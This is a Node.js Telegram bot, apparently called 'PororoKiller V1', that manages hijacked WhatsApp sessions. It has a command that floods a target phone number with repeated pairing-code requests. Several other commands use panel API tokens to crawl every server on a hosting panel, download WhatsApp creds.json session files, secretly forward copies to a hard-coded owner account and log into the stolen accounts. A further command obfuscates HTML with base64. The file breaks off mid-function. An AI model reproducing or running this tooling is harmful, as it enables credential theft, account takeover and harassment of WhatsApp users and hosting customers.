const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const ownerIds = [7860329124]; // contoh chat_id owner 


const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;


function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}


// === Command: Add Reseller ===
bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

// === Command: Add PT ===
bot.command("addpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addpt <id>");

  const data = loadAkses();
  if (data.pts.includes(id)) return ctx.reply("✗ Already PT.");

  data.pts.push(id);
  saveAkses(data);
  ctx.reply(`✓ PT added: ${id}`);
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

// === Command: Add Moderator ===
bot.command("addmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addmod <id>");

  const data = loadAkses();
  if (data.moderators.includes(id)) return ctx.reply("✗ Already Moderator.");

  data.moderators.push(id);
  saveAkses(data);
  ctx.reply(`✓ Moderator added: ${id}`);
});

bot.command("delmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delmod <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Moderator removed: ${id}`);
});


const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const delActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  const list = JSON.parse(fs.readFileSync(file_session));
  const newList = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(newList));
  console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = "║ " + padCenter(title, maxLen) + " ║";
  const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("ＳＴＡＴＵＳ", [
  `Ｎｕｍｅｒｏ : ${number}`,
  `Ｅｓｔａｄｏ : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
    `Ｎｕｍｅｒｏ : ${number}`,
    `Ｃｏ́ｄｉｇｏ : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeNumbers.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
  const shouldReconnect =
    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

  if (shouldReconnect) {
    console.log("Koneksi tertutup, mencoba reconnect...");
    await initializeWhatsAppConnections();
  } else {
    console.log("Koneksi ditutup permanen (Logged Out).");
  }
}
});
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Reconectando..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "✗ Falha na conexão."));
        // ❌ fs.rmSync(sessionDir, { recursive: true, force: true }); --> DIHAPUS
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✓ Conectado com sucesso."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "POROROV1");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};


const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  const total = 30; // jumlah pengiriman
  const delayMs = 2000; // jeda 2 detik

  try {
    await ctx.reply(
      `🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`,
      { parse_mode: "HTML" }
    );

    // pastikan koneksi WA aktif
    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");

    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "POROROV1");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;

        await ctx.telegram.sendMessage(
          chatId,
          ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (err) {
        await ctx.telegram.sendMessage(
          chatId,
          ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`,
          { parse_mode: "HTML" }
        );
      }

      await new Promise(r => setTimeout(r, delayMs));
    }

    await ctx.reply(`Selesai kirim pairing code ke ${targetNumber} sebanyak ${total}x.`, { parse_mode: "HTML" });

  } catch (error) {
    await ctx.reply(`Terjadi kesalahan: <code>${error.message}</code>`, { parse_mode: "HTML" });
  }
};

    

    

      
        
      
  bot.command("spammpair", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const target = args[0];

  if (!target) return ctx.reply("❗ Gunakan format: /spampair &lt;nomorTarget&gt;", { parse_mode: "HTML" });

  await sendPairingLoop(target, ctx, ctx.chat.id);
});

          
  

bot.command("enchtml", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from?.id;

  const premium = await isUserPremium(userId);
  if (!premium) return sendJoinButton(ctx);

  // harus reply dokumen
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.reply("❌ REPLY FILE HTML YANG MAU DI ENC");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Mw Apah</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await ctx.replyWithDocument({ source: outputPath }, { caption: "HTML FILE SUCCES DI ENC" });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ERROR SAAT MEMPROSES");
  }
});

      
            
            
      
bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<b>Hí, ${username}</b>

<i>─ PororoKillee V1 📞🦠 ─</i>
<i>Dobro pozhalovat' v PororoKiller,zyy,</i>
<i>kotoryy gotov unichtozhit' vsekh vrediteley, gaz, gospo.</i>

<b>〢「 PororoKiller V1 」</b>
<i>࿇ ᴀᴜᴛᴏʀ : @ZidxyzzEllThomas</i>
<i>࿇ ᴛɪᴘᴏ  : Caixa ✗ Plugins</i>
<i>࿇ ʟɪɢᴀ  : Programação</i>

╭─⦏ 𝑴𝒆𝒏𝒖ύ 𝑰𝒅𝒊οκτή𝒕η ⦐
│ꔹ connect
│ꔹ listsender
│ꔹ delsender
││ꔹcreateakun
│ꔹ listkey
│ꔹ delkey
╰─────────────

╭─⦏ 𝑨𝒄𝑬𝒔𝑠ο 𝑨ο 𝑴𝒆𝒏𝒐ύ ⦐
│ꔹ addacces
│ꔹ delacces
│ꔹ addowner
│ꔹ delowner
│ꔹ addreseller
│ꔹ delreseller
│ꔹ addpt
│ꔹ delpt
│ꔹ addmod
│ꔹ delmod
╰─────────────
`;

  const keyboard = new InlineKeyboard().url(
    "PORORO KILLER TEAM",
    "https://t.me/PororoV1"
  );

  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/amqzce.jpg" },
    {
      caption: teks,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }
  );
});

// command hapus sesi

bot.command("connect", async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /connect 628xxxx", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
// Command hapus sesi
// Command hapus sesi dengan Telegraf
bot.command("delsesi", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const BotNumber = args[0];

  if (!BotNumber) {
    return ctx.reply("❌ Gunakan format:\n/delsesi <nomor>");
  }

  try {
    // hapus dari list aktif
    delActive(BotNumber);

    // hapus folder sesi
    const dir = sessionPath(BotNumber);
    if (fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }

    await ctx.reply(`Sesi untuk nomor *${BotNumber}* berhasil dihapus.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal hapus sesi:", err);
    await ctx.reply(`❌ Gagal hapus sesi untuk nomor *${BotNumber}*.\nError: ${err.message}`, { parse_mode: "Markdown" });
  }
});

bot.command("ujhkjjsiddudhdg", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }

  const domain = input[0];
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("⏳ Sedang mencari folder `session` / `sessions` dan file `creds.json` di semua server ...", { parse_mode: "Markdown" });

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
      });
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];

      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");

        // Deteksi folder session atau sessions
        if ((name.toLowerCase() === "session" || name.toLowerCase() === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            });
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfName });
              }
            }
          } catch {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch {}
        } else {
          if (name.toLowerCase() === "creds.json") found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
        }
      }
      return found;
    } catch {
      return [];
    }
  }

  try {
    const res = await axios.get(`${domain.replace(/\/+$/, "")}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const data = res.data;
    if (!data || !Array.isArray(data.data)) return ctx.reply("❌ Gagal ambil list server dari panel.");

    let totalFound = 0;
    for (let srv of data.data) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          await ctx.reply(`📁 Ditemukan *creds.json* di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });

          try {
            const downloadRes = await axios.get(`${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            });
            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, { responseType: "arraybuffer" });
              const buffer = Buffer.from(fileRes.data);

              // Simpan ke folder lokal
              const BotNumber = name.replace(/\s+/g, "_"); // gunakan nama server sebagai ID unik
              const sessDir = sessionPath(BotNumber);
              const credsPath = path.join(sessDir, "creds.json");
              fs.writeFileSync(credsPath, buffer);

              // Kirim ke user yang menjalankan
              await ctx.replyWithDocument({ source: buffer, filename: `${BotNumber}_creds.json` });

              // Langsung connect ke WhatsApp
              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              } catch (e) {
                console.error(`Gagal connect WA ${BotNumber}:`, e);
              }
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e);
          }
        }
      }
    }

    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ditemukan `creds.json` di folder `session` / `sessions` manapun.");
    } else {
      await ctx.reply(`✅ Scan selesai. Total file *creds.json* ditemukan dan terhubung otomatis: ${totalFound}`);
    }
  } catch (err) {
    console.error("csessions Error:", err);
    await ctx.reply("❌ Terjadi error saat scan.");
  }
});

// Pastikan variabel/func berikut sudah ada di filemu:
// axios, fs, path, ownerIds (array), sessionPath(BotNumber), connectToWhatsApp(BotNumber, chatId, ctx)

bot.command("csessions", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }

  const domain = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("⏳ Mulai scan semua server untuk mencari folder `session` / `sessions` dan file `creds.json` ...");

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const isDir = (item) => {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return !!(a.is_directory || a.isDir || a.type === "dir" || a.mode === "dir" || a.mode === "directory");
  };

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(`${domain}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
      });
      const listJson = listRes.data;
      const items = Array.isArray(listJson?.data) ? listJson.data : [];

      let found = [];

      for (const item of items) {
        const name = (item.attributes && (item.attributes.name || item.attributes.filename)) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");

        // Log setiap path yang dicek (lihat console)
        console.log("🧭 Scanning:", normalized);

        // kalau folder namanya session atau sessions -> lihat isinya
        if (/^session(s)?$/i.test(name) && isDir(item)) {
          try {
            const sessRes = await axios.get(`${domain}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            });
            const sessItems = Array.isArray(sessRes.data?.data) ? sessRes.data.data : [];
            for (let sf of sessItems) {
              const sfName = (sf.attributes && (sf.attributes.name || sf.attributes.filename)) || sf.name || "";
              const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
              if (sfName.toLowerCase() === "creds.json") {
                found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfName });
              }
            }
          } catch (e) {
            console.warn("Warn: gagal list folder session(s):", normalized, e.message);
          }
        }

        // kalau item adalah file biasa dan namanya creds.json -> push
        if (!isDir(item) && name.toLowerCase() === "creds.json") {
          found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
        }

        // terus telusuri deeper kalau directory
        if (isDir(item)) {
          try {
            const deeper = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (deeper.length) found = found.concat(deeper);
            // sedikit jeda agar tidak ngebomb API terlalu cepat
            await sleep(150);
          } catch (e) {
            // ignore
          }
        }
      }

      return found;
    } catch (err) {
      console.error(`Error traverse ${identifier} ${dir}:`, err.message || err);
      return [];
    }
  }

  try {
    const res = await axios.get(`${domain}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const data = res.data;
    if (!data || !Array.isArray(data.data) || data.data.length === 0) {
      return ctx.reply("⚠️ Gagal ambil list server dari panel. Cek token PLTA atau endpoint.");
    }

    let totalFound = 0;

    for (const srv of data.data) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      console.log(`\n🔎 Mulai scan server: ${name} (${identifier})`);
      const foundList = await traverseAndFind(identifier, "/");

      if (foundList && foundList.length) {
        for (const fileInfo of foundList) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");
          await ctx.reply(`📁 Ditemukan *creds.json* di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });

          // download file lewat endpoint download
          try {
            const downloadRes = await axios.get(`${domain}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            });
            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, { responseType: "arraybuffer" });
              const buffer = Buffer.from(fileRes.data);

              // coba parse JSON untuk mendapatkan nomor WA (jika struktur Baileys)
              let BotNumber = name.replace(/\s+/g, "_"); // fallback kalau tidak ditemukan
              try {
                const parsed = JSON.parse(buffer.toString("utf8"));
                // struktur creds Baileys: parsed?.creds?.me?.id atau parsed?.me?.id
                const maybeId = parsed?.creds?.me?.id || parsed?.me?.id || parsed?.me?.user || parsed?.me;
                if (typeof maybeId === "string") {
                  const m = maybeId.match(/(\d+)(?=@)|^(\d+)$/);
                  if (m) BotNumber = m[1] || m[2] || BotNumber;
                }
              } catch (e) {
                // bukan JSON valid? skip parsing, gunakan nama server
              }

              // simpan ke folder sessionPath(BotNumber)
              try {
                const sessDir = sessionPath(BotNumber);
                const credsPath = path.join(sessDir, "creds.json");
                fs.writeFileSync(credsPath, buffer);
                console.log(`✓ creds.json disimpan: ${credsPath}`);
              } catch (e) {
                console.error("Gagal simpan creds.json:", e.message || e);
              }

              // kirim file ke user yang menjalankan & ownerIds
              try {
                await ctx.replyWithDocument({ source: buffer, filename: `${BotNumber}_creds.json` });
              } catch (e) {
                console.warn("Gagal kirim ke user:", e.message || e);
              }

              for (let oid of ownerIds || []) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) {
                  console.warn(`Gagal kirim file ke owner ${oid}:`, e.message || e);
                }
              }

              // coba auto connect — beri jeda kecil sebelum connect agar file tersimpan sempurna
              await sleep(500);
              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
                console.log(`✓ Mencoba connect untuk ${BotNumber}`);
              } catch (e) {
                console.error(`Gagal connect ${BotNumber}:`, e.message || e);
                await ctx.reply(`⚠️ Gagal connect otomatis untuk *${BotNumber}* — cek log.`, { parse_mode: "Markdown" });
              }

              // beri jeda agar tidak membuka banyak koneksi sekaligus
              await sleep(800);
            } else {
              console.warn("Download response tidak menyediakan url untuk file.");
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e.message || e);
          }
        } // end for foundList
      } else {
        console.log(`(0) creds.json di server ${name}`);
      }
    } // end for servers

    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ditemukan `creds.json` di folder `session` / `sessions` manapun.");
    } else {
      await ctx.reply(`✅ Scan selesai. Total file *creds.json* ditemukan & diproses: ${totalFound}`, { parse_mode: "Markdown" });
    }
  } catch (err) {
    console.error("csessions Error:", err);
    await ctx.reply("❌ Terjadi error saat scan. Cek console untuk detail.");
  }
});

// Harus ada di scope: axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot
bot.command("csesssi", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;

      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      // lokasi umum creds.json (1x percobaan)
      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json"
      ];

      let credsBuffer = null;
      let usedPath = null;

      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
            params: { file: p },
            headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
          });
          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            break; // stop after first success
          }
        } catch (e) {
          // ignore and coba path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // parse nomor WA dari creds.json
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
